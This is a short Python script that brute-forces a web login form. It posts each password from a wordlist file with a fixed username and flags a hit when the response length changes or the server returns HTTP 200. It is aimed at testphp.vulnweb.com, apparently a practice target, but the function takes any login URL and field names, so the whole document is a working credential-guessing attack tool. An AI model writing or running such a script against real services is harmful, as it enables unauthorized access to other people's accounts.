import requests


def brute_forcing(URL,username,user_label, pass_label, file, check_using_status_code = False):
    """Only Text files are allowed"""
    ## to take original file length
    if not check_using_status_code:
        data = {user_label:'a',pass_label:'a'}
        response = requests.post(URL, data=data)
        current_content = len(response.text)

    with open(file, 'r') as f:
        for password in f.readlines():
            data = {user_label:username,pass_label:password.replace('\n','')}
            response = requests.post(URL, data=data)
            if check_using_status_code:
                if response.status_code == 200:
                    print(f'Username : {username} \n Password : {password}\n\n')
            else:
                if current_content != len(response.text):
                    print(f'Username : {username} \nPassword : {password}\nContent length: {len(response.text)}\n\n')
                    break
                
                        
url =    "http://testphp.vulnweb.com/login.php"
brute_forcing(url, 'test','uname','pass','new.txt')